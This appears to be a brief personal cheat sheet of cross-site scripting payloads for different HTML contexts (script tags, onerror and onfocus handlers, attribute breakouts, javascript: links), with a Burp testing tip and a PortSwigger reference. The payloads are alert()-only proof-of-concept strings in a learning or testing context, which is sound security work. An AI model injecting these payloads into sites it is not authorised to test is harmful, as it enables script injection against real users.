# XSS contexts:
## normal:
```
<script>alert(document.domain)</script> 
```
```
<img src=1 onerror=alert(1)>
```
### in tag attributes:
```
"><script>alert(document.domain)</script>
```
More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example:
```
" autofocus onfocus=alert(document.domain) x="
```
### tag attribute that can make its own scriptable context:
```
<a href="javascript:alert(document.domain)">
```
# some tricks:
- a good way to test payloads is to include a random search term before the payload. that way in the response tab of burp u can see each and every location the term appears 
# Topic References:
- XSS in hidden input feilds: https://portswigger.net/research/xss-in-hidden-input-fields
